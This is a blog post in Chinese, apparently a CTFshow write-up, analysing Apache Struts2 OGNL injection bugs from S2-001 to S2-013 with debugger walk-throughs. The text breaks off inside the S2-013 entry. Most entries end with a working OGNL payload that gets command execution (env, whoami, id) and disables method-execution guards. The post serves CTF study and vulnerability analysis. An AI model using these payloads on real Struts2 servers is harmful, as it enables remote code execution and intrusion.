href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowJava</title>
      <link href="/posts/efe011ec.html"/>
      <url>/posts/efe011ec.html</url>
      
        <content type="html"><![CDATA[        <h1 id="CTFshow-Java"   >          <a href="#CTFshow-Java" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTFshow-Java" class="headerlink" title="CTFshow Java"></a>CTFshow Java</h1>      <p>全部题都是struts2<span class="exturl"><a class="exturl__link"   href="https://so.csdn.net/so/search?q=%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020" >框架</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>漏洞</p><p>Struts2是用Java语言编写的一个基于<span class="exturl"><a class="exturl__link"   href="https://so.csdn.net/so/search?q=MVC&spm=1001.2101.3001.7020" >MVC</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>设计模式的Web应用框架</p><p>注意以下所有漏洞都可以直接利用公开的脚本进行一键利用</p><p>首先要了解一下OGNL中的特殊符号作用</p><blockquote><ul><li><code>%</code>的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值</li><li><code>#</code>的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</li><li><code>$</code>主要是在Struts 2配置文件中，引用OGNL表达式</li></ul></blockquote><p>关于OGNL语言的介绍可以看<span class="exturl"><a class="exturl__link"   href="https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/" >这里</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，在这里可以进行利用是因为struts将其作为默认语言</p><p>判断页面是否基于Struts2：</p><ul><li>通过页面回显的错误消息来判断，页面不回显错误消息时则无效</li><li>通过网页后缀来判断，如.do .action，有可能不准<ul><li>如果配置文件中常数extension的值以逗号结尾或者有空值，指明了action可以不带后缀，那么不带后缀的uri也可能是struts2框架搭建的</li><li>如果使用Struts2的rest插件，其默认的struts-plugin.xml指定的请求后缀为xhtml,xml和json</li></ul></li><li>判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true</li></ul><p><span class="exturl"><a class="exturl__link"   href="https://github.com/HatBoy/Struts2-Scan" >脚本链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="ValueStack"   >          <a href="#ValueStack" class="heading-link"><i class="fas fa-link"></i></a><a href="#ValueStack" class="headerlink" title="ValueStack"></a>ValueStack</h2>      <p>后面会高频出现的一个东西，先来了解一下</p><p>首先Struts2的运行流程是（后面的很多东西都是基于这个流程分析的）</p><p><img src="https://taomujian.github.io/img/S2-008/images/%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="流程图"></p><ol><li><p>HTTP请求经过一系列的标准过滤器(Filter)组件链(这些拦截器可以是Struts2 自带的,也可以是用户自定义的,本环境中struts.xml中的package继承自struts-default,struts-default就使用了Struts2自带的拦截器.ActionContextCleanUp主要是清理当前线程的ActionContext、Dispatcher,FilterDispatcher主要是通过ActionMapper来决定需要调用那个Action,FilterDispatcher是控制器的核心,也是MVC中控制层的核心组件),最后到达FilterDispatcher过滤器.</p></li><li><p>核心控制器组件FilterDispatcher根据ActionMapper中的设置确定是否需要调用某个Action组件来处理这个HttpServletRequest请求,如果ActionMapper决定调用某个Action组件,FilterDispatcher核心控制器组件就会把请求的处理权委托给ActionProxy组件.</p></li><li><p>ActionProxy组件通过Configuration Manager组件获取Struts2框架的配置文件struts.xml,最后找到需要调用的目标Action组件类,然后ActionProxy组件就创建出一个实现了命令模式的ActionInvocation类的对象实例类的对象实例(这个过程包括调用Anction组件本身之前调用多个的拦截器组件的before()方法)同时ActionInvocation组件通过代理模式调用目标Action组件.但是在调用之前ActionInvocation组件会根据配置文件中的设置项目加载与目标Action组件相关的所有拦截器组件(Interceptor)</p></li><li><p>一旦Action组件执行完毕,ActionInvocation组件将根据开发人员在Struts2.xml配置文件中定义的各个配置项目获得对象的返回结果,这个返回结果是这个Action组件的结果码(比如SUCCESS、INPUT),然后根据返回的该结果调用目标JSP页面以实现显示输出.</p></li><li><p>最后各个拦截器组件会被再次执行(但是顺序和开始时相反,并调用after()方法),然后请求最终被返回给系统的部署文件中配置的其他过滤器,如果已经设置了ActionContextCleanUp过滤器,那么FilterDispatcher就不会清理在ThreadLocal对象中保存的ActionContext信息.如果没有设置ActionContextCleanUp过滤器,FilterDispatcher就会清除掉所有的ThreadLocal对象.</p></li></ol>        <h2 id="279"   >          <a href="#279" class="heading-link"><i class="fas fa-link"></i></a><a href="#279" class="headerlink" title="279"></a>279</h2>      <p>漏洞：S2-001</p><p>漏洞成因：当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据</p><p>影响版本：WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</p><p>漏洞分析：</p><ol><li><p>首先断点打在接受参数并验证的地方，进而跟进触发点<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100121467.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100124296.png"></p></li><li><p>由于验证失败导致返回error进行渲染，查看对<code>&lt;s:textfield&gt;</code>标签的渲染规则</p><blockquote><p>jsp文件中遇到Struts2标签 &lt;s:textfield 时程序会先调用 doStartTag,并将标签中的属性设置到TextFieldTag对象相应属性中.在遇到 /&gt; 结束标签的时候调用doEndTag方法</p></blockquote><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100126720.png"></p></li><li><p>直接在渲染函数处打断点，在<code>org.apache.struts2.views.jsp.ComponentTagSupport</code>中找到上述提到的两个函数<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100129583.png"></p></li><li><p>跟进end方法，继续跟进evaluateParams方法，可以看到在这个方法中如果开启了altSyntax，那么就会在name属性的字段两边添加OGNL表达式字符生成expr属性，步过执行发现expr内容确实被改变<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100134657.png"></p></li><li><p>继续跟进findValue方法，在这里就能看到出问题的点了，就是translateVariables方法<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100141364.png"></p></li><li><p>步入后发现其又调用了同名重载方法，直接看重载后的函数内容<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100144830.png"></p><blockquote><p>第一次获取o的值,这里的stack为OgnlValueStack,它是ValueStack的实现类.ValueStack是Struts2的一个接口,表面意义为值栈,类似于一个数据中转站,Struts2的数据都会保存在ValueStack中.Struts2在发起请求创建Action实例的同时会创建一个OgnlValueStack值栈实例.Struts2使用OGNL将请求Action的参数封装为对象存储到值栈中,并通过OGNL表达式读取值栈中的对象属性值.</p><p>ValueStack中有两个主要区域:</p><p>​    CompoundRoot区域:是一个ArrayList,存储了Action实例,它作为OgnlContext的Root对象.获取root数据不需要加#</p><p>​    context区域:即OgnlContext上下文,是一个Map,放置web开发常用的对象数据的引用.request、session、parameters、application等.获取context数据需要加#</p><p>操作值栈,通常指的是操作ValueStack中的root区域.</p><p>OgnlValueStack的findValue方法可以在CompoundRoot中从栈顶向栈底找查找对象的属性值</p></blockquote><p>以上为大佬解析的stack变量的内容，不管如何，我们直接跟进到55行的stack的findValue方法中，可以看到传入的参数内容<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100206870.png">继续步入到<code>OgnlUtil.getValue</code>方法中，继续步入到<code>Ognl.getValue</code>方法中，可以看到其对name参数进行了compile操作并返回传入的getValue方法，将username中的内容取出并执行其中的OGNL表达式<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100215156.png">如此反复可以看到最后OGNL表达式被成功执行并且结果存入了result中<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100215768.png"></p></li></ol><p>payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 获取tomcat路径</span><span class="token operator">%</span><span class="token punctuation">&#123;</span><span class="token string">"tomcatBinDir&#123;"</span><span class="token operator">+</span><span class="token annotation punctuation">@java.lang.System</span><span class="token annotation punctuation">@getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取web路径</span><span class="token operator">%</span><span class="token punctuation">&#123;</span>#req<span class="token operator">=</span><span class="token annotation punctuation">@org.apache.struts2.ServletActionContext</span><span class="token annotation punctuation">@getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token operator">=</span>#context<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>#req<span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// 命令执行 env，flag就在其中</span><span class="token operator">%</span><span class="token punctuation">&#123;</span>#a<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"env"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#b<span class="token operator">=</span>#a<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span>#b<span class="token punctuation">)</span><span class="token punctuation">,</span>#d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span>#c<span class="token punctuation">)</span><span class="token punctuation">,</span>#e<span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">50000</span><span class="token punctuation">]</span><span class="token punctuation">,</span>#d<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>#e<span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token operator">=</span>#context<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">(</span>#e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="280"   >          <a href="#280" class="heading-link"><i class="fas fa-link"></i></a><a href="#280" class="headerlink" title="280"></a>280</h2>      <p>漏洞：S2-003 S2-005 <em>CVE-2008-6504</em></p><p>漏洞成因：</p><ul><li>S2-003成因是Struts2将HTTP的每个参数名解析为ognl语句执行，而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果</li><li>S2-005的原理和S2-003基本相似，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003</li></ul><p>影响范围：Struts 2.0.0 - Struts 2.1.8.1</p><p>漏洞分析：</p><ol><li>首先触发点<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor</code>，可以看到默认的<code>denyMethodExecution</code>值是true，改为false才能继续执行，所以payload中部分内容是要将其改为false的<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111446997.png"></li><li>查看执行payload后其中获取的参数<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111447204.png"></li><li>步入setParameters函数，函数通过迭代器将参数逐个取出<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111450215.png"></li><li>步入acceptableName函数，继续步入isAccepted函数<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111455764.png"></li><li>可以看到此处的正则表达式只是简单的对#进行了过滤并没有过滤unicode字符，最终执行结束返回字符串使得判定为真<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111501736.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111459231.png"></li><li>下一步继续跟进stack的setValue方法<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111556550.png"></li><li>发现其又调用了同名的重载方法，继续跟进<code>OgnlUtil.setValue</code><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111605549.png"></li><li>跟入compile方法，继续跟入parseExpression方法，继续跟入topLevelExpression方法，继续进入expression，经过一系列操作后最终解析到<code>ognl.JavaCharStream#readChar</code>对字符串进行操作<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111607140.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111610477.png"></li><li>可以看到其对\u类型的字符进行了专门的解析，将其转化为正常字符，导致OGNL表达式执行<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111615029.png"></li></ol>        <h2 id="281"   >          <a href="#281" class="heading-link"><i class="fas fa-link"></i></a><a href="#281" class="headerlink" title="281"></a>281</h2>      <p>漏洞：S2-007 <em>CVE-2012-0838</em></p><p>漏洞成因：在Struts2中,可以将HTTP请求数据注入到实际业务Action的属性中,这些属性可以是任意类型的数据,通过HTTP只能获取到String类型数据,Struts2中默认有一个类型转换器,可以完成大部分的自动转换操作,可以通过xml文件,来定义转换规则.比如Action类中有一个integer属性,不需要执行任何操作,Struts会自动将请求参数转换为integer属性.当配置了Validation时,若类型转换出错,后端默认会将用户提交的表单值通过字符串拼接,然后执行一次OGNL表达式解析并返回,从而可以构造特殊的恶意请求来执行命令.这种利用方式和S2-001的很相似,不同的是利用点不同.</p><p>影响版本：Struts 2.0.0 - Struts 2.2.3</p><p>漏洞分析：</p><ol><li>首先看demo中对Struts2的默认类型转换器的调用，其通过xml文件来定义转换规则，在环境给予的demo中就将age转换为int类型，范围在1-100<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141518983.png"></li><li>具体漏洞触发点就在<code>com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor</code>中，先在对应位置打好断点，然后发起请求，将payload放入<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141522934.png"></li><li>可以看到此处的代码将转换出问题的内容放入了<code>conversionErrors</code>变量中，并在i$迭代器中循环将属性名赋值给propertyName，属性值赋值给value<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141530747.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141534846.png"></li><li>最后对fakie进行的put操作，我们跟进<code>getOverrideExpr</code>方法，可以看到对value进行处理时对字符串前后分别添加了一个单引号，这也是我们的payload是这种格式的原因，<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141539863.png"></li><li>最终走入OgnlValueStack的setExprOverrides方法，将fakie赋值给overrides属性<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141547096.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141545456.png"></li><li>当拦截器执行结束后会将jsp内容进行解析，会从OgnlValueStack的overrides属性中寻找key为age的键值对并执行ognl表达式</li></ol><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,#foo&#x3D;new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="282"   >          <a href="#282" class="heading-link"><i class="fas fa-link"></i></a><a href="#282" class="headerlink" title="282"></a>282</h2>      <p>漏洞：S2-008 <em>CVE-2012-0391</em></p><p>漏洞成因：Struts2框架存在一个devmode模式,当devmode模式开启时,Struts2对传入的参数没有严格限制,导致多个地方可以执行恶意代码</p><p>影响版本：Struts 2.0.0 - Struts 2.3.17</p><p>漏洞分析：</p><ol><li>首先看出发点位置在<code>org.apache.struts2.interceptor.debugging.DebuggingInterceptor</code>，在第95行处打断点，获取到debug的值为command，进入else if的判断，查看内容<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100057285.png"></li><li>可以看到进入了else if的判断后将expression传入参数的值在138行交给了cmd，又在145行通过<code>stack.findValue</code>执行了OGNL表达式并将回显内容写入页面<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100101557.png"></li></ol><p>漏洞修复：在之后的版本中使用正则表达式来防止内容执行</p><p>Payload：</p><pre class="line-numbers language-none"><code class="language-none">?debug&#x3D;command&amp;expression&#x3D;%28%23_memberAccess%5B&quot;allowStaticMethodAccess&quot;%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28&quot;false&quot;%29%20%2C%23context%5B&quot;xwork.MethodAccessor.denyMethodExecution&quot;%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="283"   >          <a href="#283" class="heading-link"><i class="fas fa-link"></i></a><a href="#283" class="headerlink" title="283"></a>283</h2>      <p>漏洞：S2-009 <em>CVE-2011-3923</em></p><p>漏洞成因：Struts2框架中ParametersInterceptor拦截器只检查传入的参数名是否合法,不会检查参数值，例如传入参数<code>top[&#39;foo&#39;](0)</code>会通过ParametersInterceptor的白名单检查,OGNL会将其解析为(top[‘foo’])(0),并将foo的值也作为OGNL表达式进行计算从而造成代码执行</p><p>其实这个漏洞是对S2-003和S2-005漏洞的绕过.S2-003的修复方法是禁止#号，于是S2-005通过使用#号的unicode编码\u0023或8进制编码\43来绕过，Struts2对S2-005的修复方法是禁止\等特殊符号，这次是通过Struts2框架中ParametersInterceptor拦截器只检查传入的参数名而不检查参数值的方式进行构造OGNL表达式从而造成代码执行</p><p>影响版本：Struts 2.0.0 - Struts 2.3.1</p><p>漏洞分析：</p><ol><li>流程与S2-005基本相同，跳过分析，直接分析payload</li><li>当有形似(one)(two)的变量时，one会被当作一个OGNL表达式去计算，然后把它的结果当作另一个以two为根对象的OGNL表达式再一次计算，所以，如果one有返回内容，那么这些内容将会被当作OGNL语句被计算，而payload结尾传入的<code>z[(name)(%27meh%27)]</code>就是为了把name参数的值当作OGNL表达式计算</li></ol><p>payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">?</span>age<span class="token operator">=</span><span class="token number">12313</span><span class="token operator">&amp;</span>name<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23</span>context<span class="token punctuation">[</span><span class="token operator">%</span><span class="token number">22</span>xwork<span class="token punctuation">.</span>MethodAccessor<span class="token punctuation">.</span>denyMethodExecution<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">+</span><span class="token keyword">new</span><span class="token operator">+</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Boolean</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">+</span><span class="token operator">%</span><span class="token number">23_</span>memberAccess<span class="token punctuation">[</span><span class="token operator">%</span><span class="token number">22</span>allowStaticMethodAccess<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token operator">+</span><span class="token operator">%</span><span class="token number">23</span>a<span class="token operator">=</span><span class="token annotation punctuation">@java.lang.Runtime</span><span class="token annotation punctuation">@getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">27</span>whoami<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>b<span class="token operator">=</span><span class="token keyword">new</span><span class="token operator">+</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>c<span class="token operator">=</span><span class="token keyword">new</span><span class="token operator">+</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23d</span><span class="token operator">=</span><span class="token keyword">new</span><span class="token operator">+</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">51020</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>c<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23d</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>kxlzx<span class="token operator">=</span><span class="token annotation punctuation">@org.apache.struts2.ServletActionContext</span><span class="token annotation punctuation">@getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>kxlzx<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23d</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>kxlzx<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>meh<span class="token punctuation">)</span><span class="token operator">&amp;</span>z<span class="token punctuation">[</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">27</span>meh<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="284"   >          <a href="#284" class="heading-link"><i class="fas fa-link"></i></a><a href="#284" class="headerlink" title="284"></a>284</h2>      <p>漏洞：S2-012 <em>CVE-2013-1965</em></p><p>漏洞成因：在Struts2框架中，如果配置Action中的Result时使用了重定向类型，并且还使用${param_name}作为重定向变量，当触发redirect类型返回时，Struts2使用${param_name}获取其值，在这个过程中会对name参数的值执行OGNL表达式解析,从而可以插入任意OGNL表达式导致任意代码执行</p><p>影响版本：Struts 2.0.0 - Struts 2.3.14.2</p><p>漏洞分析：</p><ol><li><p>首先还是查看配置文件，可以看到其中使用了redirect方法并且返回值中使用了${name}取值，存在漏洞触发条件<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142228174.png"></p></li><li><p>在<code>com.opensymphony.xwork2.DefaultActionInvocation</code>类中打断点<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142230130.png"></p></li><li><p>步入方法，createResult方法会根据action的返回值获取对应的result标签配置，然后传入到buildResult方法中，这个方法的作用是生成对应的Result实现类，也就是<code>org.apache.struts2.dispatcher.ServletRedirectResult</code>类，并把对应 result标签的值/index.jsp?name=${name}设置给ServletRedirectResult 类的location属性，然后返回ServletRedirectResult<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142322880.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142322785.png"></p></li><li><p>然后返回到executeResult方法中继续执行，进入到<code>this.result.execute</code>中，查看result就是ServletRedirectResult类型，步入发现其执行了super的execute方法，继续跟入conditionalParse方法，发现其执行了S2-001中同名关键方法translateVariables，并且通过重载能看到限制了循环次数最高为1，这就是对S2-001的漏洞修复<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142328950.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142334539.png"></p></li><li><blockquote><p>对于S2-001漏洞,官方设置了循环次数,从而限制恶意代码,但这个设置的循环次数是针对的while循环,在外面还有一个for循环,for循环开始的pos参数用来获取expression表达式的开始位置,比如解析完了%{password}的值,下一次解析是从%{password}后面开始.在S2-001的修复中它被放在了for循环里,导致第二次for循环时pos的值会被重置为0.从而又从头开始解析.从下图中的变量值可以看到for进行了2次循环,循环2次是因为传入的参数new char[]{‘$’, ‘%’}长度为2导致的.for第二次循环时open为arr数组的第二个参数%,这个%和{组合后又成了S2-001的利用所需要的条件,最后还是通过while循环中的stack.findValue来进行执行代码的.S2-001修复方案中的增加loopCount变量限制了while循环的次数,却没有限制for循环的次数,每次for循环开始时loopCount都会被重置为1.</p></blockquote><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142337790.png"></p></li></ol><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="285"   >          <a href="#285" class="heading-link"><i class="fas fa-link"></i></a><a href="#285" class="headerlink" title="285"></a>285</h2>      <p>漏洞：S2-013 <em>CVE-2013-1966</em></p><p>漏洞成因：在Struts2标签中和都包含一个includeParams属性，其值可设置为none、get 或 all，其对应意义分别为：none:链接不包含请求的任意参数值(默认)，get:链接只包含GET请求中的参数和其值，all:链接包含GET和POST所有参数和其值，用来显示一个超链接,当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上，这个参数会进行OGNL表达式解析，从而可以插入任意OGNL表达式导致任意代码执行</p><p>影响版本：<em>Struts 2.0.0 - Struts 2.3.14.1</em></p><p>漏洞分析：</p><ol><li>看配置文件，includeParams属性为all<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209150147876.png"></li><li><code>org.apache.struts2.components.ComponentUrlProvider</code>打断点<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209150209394.png"></li><li>跟入beforeRenderUrl函数，这个函数获取了url所传递的参数可以看到includeParams参数为all，此处的mergeRequestParameters获取到了url中传递的参数<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209151820358.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161613470.png"></li><li>步过执行直到end函数，继续步入renderUrl函数，此时我们能看到我们的payload已经被放入到了urlComponent的paramters属性中，继续跟入determineActionURL函数<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161706306.png"><img 